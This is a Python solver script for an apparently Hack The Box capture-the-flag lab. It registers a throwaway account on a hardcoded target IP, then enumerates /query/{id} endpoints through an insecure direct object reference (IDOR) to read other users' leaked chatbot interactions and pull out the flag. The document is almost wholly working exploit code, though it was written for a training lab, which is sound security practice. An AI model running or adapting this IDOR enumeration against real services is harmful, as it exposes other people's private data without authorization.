#!/usr/bin/env python3
import argparse
import random
import re
import string
from typing import Optional

import requests


FLAG_RE = re.compile(r"HTB\{[^}]+\}")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=(
            "Solve the insecure integrated components lab by abusing query IDOR "
            "to retrieve leaked chatbot interactions and extract the flag."
        )
    )
    parser.add_argument(
        "--base-url",
        default="http://154.57.164.64:31128",
        help="Target base URL (default: http://154.57.164.64:31128)",
    )
    parser.add_argument(
        "--max-id",
        type=int,
        default=120,
        help="Maximum query ID to enumerate (default: 120)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=5,
        help="HTTP timeout in seconds (default: 5)",
    )
    return parser.parse_args()


def random_username() -> str:
    suffix = "".join(random.choice(string.ascii_lowercase) for _ in range(8))
    return f"u{suffix}{random.randint(100, 999)}"


def register_and_login(session: requests.Session, base_url: str, timeout: int) -> None:
    username = random_username()
    password = "P@ssw0rd123!"

    reg_resp = session.post(
        f"{base_url}/register",
        data={"username": username, "password": password},
        timeout=timeout,
        allow_redirects=True,
    )
    reg_resp.raise_for_status()

    login_resp = session.post(
        f"{base_url}/login",
        data={"username": username, "password": password},
        timeout=timeout,
        allow_redirects=True,
    )
    login_resp.raise_for_status()


def try_extract_flag(text: str) -> Optional[str]:
    match = FLAG_RE.search(text)
    if match:
        return match.group(0)
    return None


def main() -> None:
    args = parse_args()
    base_url = args.base_url.rstrip("/")

    session = requests.Session()
    session.headers.update({"User-Agent": "htb-iic-solver/1.0"})

    register_and_login(session, base_url, args.timeout)

    for query_id in range(1, args.max_id + 1):
        try:
            response = session.get(
                f"{base_url}/query/{query_id}",
                timeout=args.timeout,
            )
            response.raise_for_status()
        except requests.RequestException:
            continue

        flag = try_extract_flag(response.text)
        if flag:
            print(f"[+] Flag found in query/{query_id}: {flag}")
            return

    raise SystemExit(
        f"[!] Flag not found in range 1..{args.max_id}. "
        "Increase --max-id and retry."
    )


if __name__ == "__main__":
    main()
